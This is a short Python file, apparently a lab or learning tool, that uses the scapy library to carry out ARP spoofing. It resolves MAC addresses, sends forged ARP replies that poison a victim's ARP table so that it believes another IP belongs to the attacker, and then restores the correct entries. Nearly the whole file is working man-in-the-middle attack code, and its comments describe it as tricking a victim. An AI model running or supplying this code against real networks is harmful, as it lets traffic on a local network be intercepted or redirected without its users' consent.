from scapy.all import ARP, Ether, send, srp
import time
import sys


# get MAC from IP
def get_mac(ip, interface): # Sends ARP request and returns the MAC address for a given IP
    arp_request = ARP(pdst=ip)  # Ask - who has this IP?
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # Send to everyone on LAN
    packet = broadcast / arp_request           # Stack layers: Ethernet + ARP

    answered = srp(packet, timeout=2, verbose=False, iface=interface)[0]  # Send and wait for reply
    if answered:
        return answered[0][1].hwsrc  # to return the MAC from the reply
    else:
        print(f"--- No response for IP {ip}")
        sys.exit(1)

# sending ARP Spoof Packet
def spoof(victim_ip, victim_mac, spoof_ip, interface): # Sends a spoofed ARP reply to a victim to trick them

    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(packet, verbose=False, iface=interface)

# restoring ARP Table
def restore(victim_ip, victim_mac, real_ip, real_mac, interface): # Sends the correct ARP reply to fix the ARP table after poisoning
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=real_ip, hwsrc=real_mac)
    send(packet, count=5, verbose=False, iface=interface)  # multiple times to ensure update

